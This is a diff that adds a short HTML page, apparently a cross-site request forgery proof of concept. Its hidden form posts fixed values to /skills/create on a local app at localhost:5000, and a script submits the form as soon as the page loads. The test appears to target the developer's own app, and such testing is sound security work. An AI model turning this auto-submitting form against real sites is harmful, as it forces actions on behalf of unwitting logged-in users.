@@ -1,0 +1,15 @@
+<!doctype html>
+<html>
+  <body>
+    <form id="attack" action="http://localhost:5000/skills/create" method="POST">
+      <input type="hidden" name="title" value="CSFR" />
+      <input type="hidden" name="is_free" value="1" />
+      <input type="hidden" name="category" value="1" />
+      <input type="hidden" name="subcategory" value="1" />
+      <input type="hidden" name="description" value="CSRF test from attacker page">
+    </form>
+    <script>
+      document.getElementById('attack').submit();
+    </script>
+  </body>
+</html>
